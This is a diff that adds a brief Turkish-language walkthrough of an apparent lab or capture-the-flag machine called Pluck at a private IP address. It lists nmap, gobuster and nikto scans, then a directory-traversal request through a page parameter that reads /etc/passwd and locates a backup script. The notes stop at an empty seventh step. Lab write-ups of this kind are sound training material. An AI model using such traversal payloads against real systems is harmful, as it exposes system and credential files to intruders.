@@ -1,0 +1,8 @@
+PLUCK MAKİNE ÇÖZÜMÜ
+1 - IP adresi makine ekranında 192.168.2.36 bulundu.
+2 - nmap -sT -A 192.168.2.36
+3 - gobuster dir -u http://192.168.2.36 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - nikto -h 192.168.2.36
+5 - http://192.168.2.36/index.php?page=../../../../../../../../../../etc/passwd, Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh 
+6 - http://192.168.2.36/index.php?page=/usr/local/scripts/backup.sh
+7 - 
